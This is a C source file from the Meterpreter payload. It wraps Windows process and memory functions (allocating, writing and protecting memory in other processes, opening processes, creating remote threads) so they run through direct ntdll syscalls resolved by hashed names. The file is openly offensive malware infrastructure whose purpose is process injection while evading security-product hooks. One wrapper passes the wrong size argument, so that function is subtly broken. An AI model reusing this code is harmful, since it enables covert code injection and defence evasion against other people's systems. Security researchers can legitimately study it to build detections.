#ifndef _METERPRETER_WINAPI_H
#define _METERPRETER_WINAPI_H
#include "winapi.h"

#include <ntdef.h>

#include "../ReflectiveDLLInjection/dll/src/DirectSyscall.h"
#include "common.h"

#define KERNEL32_DLL "kernel32.dll"
#define NTDLL_DLL "ntdll.dll"

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

typedef struct NtDllFunction {
    LPCSTR lpFunctionName;
    DWORD dwNumberOfArgs;
} NtDllFunction;

NtDllFunction lpFunctionsTobeLoaded[] = {
    {.lpFunctionName = "ZwAllocateVirtualMemory", .dwNumberOfArgs = 6},
    {.lpFunctionName = "ZwOpenProcess", .dwNumberOfArgs = 4},
    {.lpFunctionName = "ZwWriteVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwReadVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwProtectVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwQueryVirtualMemory", .dwNumberOfArgs = 6},
    {.lpFunctionName = "ZwFreeVirtualMemory", .dwNumberOfArgs = 4}};

enum NtDllSyscall {
    ZwAllocateVirtualMemory,
    ZwOpenProcess,
    ZwWriteVirtualMemory,
    ZwReadVirtualMemory,
    ZwProtectVirtualMemory,
    ZwQueryVirtualMemory,
    ZwFreeVirtualMemory
};

Syscall** lpWinApiSyscalls = NULL;

extern NTSTATUS SyscallStub(Syscall *pSyscall, ...);

Syscall** GetOrInitWinApiSyscalls() {
    if (lpWinApiSyscalls == NULL) {
        BOOL bError = FALSE;
        HANDLE hHeap = GetProcessHeap();
        bError = hHeap == NULL;
        DWORD dwNumbOfSyscalls = sizeof(lpFunctionsTobeLoaded) / sizeof(NtDllFunction);
        Syscall* lpSyscall = NULL;
        if (!bError) {
            lpWinApiSyscalls = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall*) * dwNumbOfSyscalls);
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpWinApiSyscalls = %p", lpWinApiSyscalls);
            bError = lpWinApiSyscalls == NULL;
        }
        if (!bError) {
            for (int i = 0; i < dwNumbOfSyscalls; i++) {
                lpSyscall = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));
                bError = lpSyscall == NULL;
                if (bError) {
                    break;
                }
                lpSyscall->dwCryptedHash = _hash((char*)lpFunctionsTobeLoaded[i].lpFunctionName);
                lpSyscall->dwNumberOfArgs = lpFunctionsTobeLoaded[i].dwNumberOfArgs;
                lpWinApiSyscalls[i] = lpSyscall;
                dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpSyscall = %p; dwCryptedHash = %d", lpSyscall, lpSyscall->dwCryptedHash);
            }
        }
        if (!bError) {
            bError = !getSyscalls(GetModuleHandleA(NTDLL_DLL), lpWinApiSyscalls, dwNumbOfSyscalls);
        }
        if (bError) {
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] Error creating Syscall structure.");
            if (lpWinApiSyscalls != NULL) {
                for (int i = 0; i < dwNumbOfSyscalls; i++) {
                    lpSyscall = lpWinApiSyscalls[i];
                    if (lpSyscall != NULL) {
                        HeapFree(hHeap, 0, lpSyscall);
                    }
                }
                HeapFree(hHeap, 0, lpWinApiSyscalls);
                lpWinApiSyscalls = NULL;
            }
        }
    }

    return lpWinApiSyscalls;
}

BOOL hasDirectSyscallSupport() {
    if(lpWinApiSyscalls == NULL) {
        if(GetOrInitWinApiSyscalls() != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

void* GetFunction(LPCSTR lpModuleName, LPCSTR lpFunctionName) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddress(hModule, lpFunctionName);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find '%s' function's address.", lpFunctionName);
    }
    return lpOutput;
}

NTSTATUS winapi_ntdll_ZwAllocateVirtualMemory(HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
    return SyscallStub(lpWinApiSyscalls[ZwAllocateVirtualMemory], hProcess, pBaseAddress, pZeroBits, pRegionSize, ulAllocationType, ulProtect);
}

NTSTATUS winapi_ntdll_ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    return SyscallStub(lpWinApiSyscalls[ZwOpenProcess], ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS winapi_ntdll_ZwWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten) {
    return SyscallStub(lpWinApiSyscalls[ZwWriteVirtualMemory], ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS winapi_ntdll_ZwReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesRead) {
    return SyscallStub(lpWinApiSyscalls[ZwReadVirtualMemory], ProcessHandle, BaseAddress, Buffer, NumberOfBytesRead, NumberOfBytesRead);
}

NTSTATUS winapi_ntdll_ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    return SyscallStub(lpWinApiSyscalls[ZwProtectVirtualMemory], ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS winapi_ntdll_ZwQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    return SyscallStub(lpWinApiSyscalls[ZwQueryVirtualMemory], ProcessHandle, BaseAddress, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);
}

NTSTATUS winapi_ntdll_ZwFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    return SyscallStub(lpWinApiSyscalls[ZwFreeVirtualMemory], ProcessHandle, BaseAddress, RegionSize, FreeType);
}

BOOL winapi_kernel32_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    if (hasDirectSyscallSupport()) {
        return winapi_ntdll_ZwWriteVirtualMemory(hProcess, lpBaseAddress, (LPVOID)lpBuffer, nSize, (PULONG)lpNumberOfBytesWritten) == ERROR_SUCCESS;
    } else {
        BOOL (*pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) = GetFunction(KERNEL32_DLL, "WriteProcessMemory");
        if (pWriteProcessMemory) {
            return pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    if (hasDirectSyscallSupport()) {
        return winapi_ntdll_ZwReadVirtualMemory(hProcess, (LPVOID)lpBaseAddress, lpBuffer, nSize, (PULONG)lpNumberOfBytesRead) == ERROR_SUCCESS;
    } else {
        BOOL (*pReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) = GetFunction(KERNEL32_DLL, "ReadProcessMemory");
        if (pReadProcessMemory) {
            return pReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (hasDirectSyscallSupport()) {
        OBJECT_ATTRIBUTES objAttributes;
        CLIENT_ID clientId;
        HANDLE hProcess = NULL;
        clientId.UniqueThread = NULL;
        clientId.UniqueProcess = (HANDLE)((ULONG_PTR)dwProcessId);
        InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);
        NTSTATUS dwStatus = winapi_ntdll_ZwOpenProcess(&hProcess, dwDesiredAccess, &objAttributes, &clientId);
        if (dwStatus == ERROR_SUCCESS) {
            return hProcess;
        }
    } else {
        HANDLE (*pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = GetFunction(KERNEL32_DLL, "OpenProcess");
        if (pOpenProcess) {
            return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(GetCurrentProcess(), &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        if (dwStatus == ERROR_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (*pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunction(KERNEL32_DLL, "VirtualAlloc");
        if (pVirtualAlloc) {
            return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(hProcess, &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        if (dwStatus == ERROR_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (*pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunction(KERNEL32_DLL, "VirtualAllocEx");
        if (pVirtualAllocEx) {
            return pVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

BOOL winapi_kernel32_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        return winapi_ntdll_ZwProtectVirtualMemory(GetCurrentProcess(), lpAddress, &dwDataSize, flNewProtect, lpflOldProtect) == ERROR_SUCCESS;
    } else {
        BOOL (*pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunction(KERNEL32_DLL, "VirtualProtect");
        if (pVirtualProtect) {
            return pVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        return winapi_ntdll_ZwProtectVirtualMemory(hProcess, lpAddress, &dwDataSize, flNewProtect, lpflOldProtect) == ERROR_SUCCESS;
    } else {
        BOOL (*pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunction(KERNEL32_DLL, "VirtualProtectEx");
        if (pVirtualProtectEx) {
            return pVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

SIZE_T winapi_kernel32_VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(GetCurrentProcess(), (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, sizeof(MEMORY_BASIC_INFORMATION), &returnLength);
        if (dwStatus == ERROR_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (*pVirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunction(KERNEL32_DLL, "VirtualQuery");
        if (pVirtualQuery) {
            return pVirtualQuery(lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

SIZE_T winapi_kernel32_VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;

        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(hProcess, (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &returnLength);
        if (dwStatus == ERROR_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (*pVirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunction(KERNEL32_DLL, "VirtualQueryEx");
        if (pVirtualQueryEx) {
            return pVirtualQueryEx(hProcess, lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

BOOL winapi_kernel32_VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if(hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        return winapi_ntdll_ZwFreeVirtualMemory(GetCurrentProcess(), lpAddress, &dwDataSize, dwFreeType) == ERROR_SUCCESS;
    }else{
        BOOL (*pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) = GetFunction(KERNEL32_DLL, "VirtualFree");
        if (pVirtualFree) {
            return pVirtualFree(lpAddress, dwSize, dwFreeType);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE (*pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = GetFunction(KERNEL32_DLL, "CreateRemoteThread");
    if (pCreateRemoteThread) {
        return pCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }
    return NULL;
}
#endif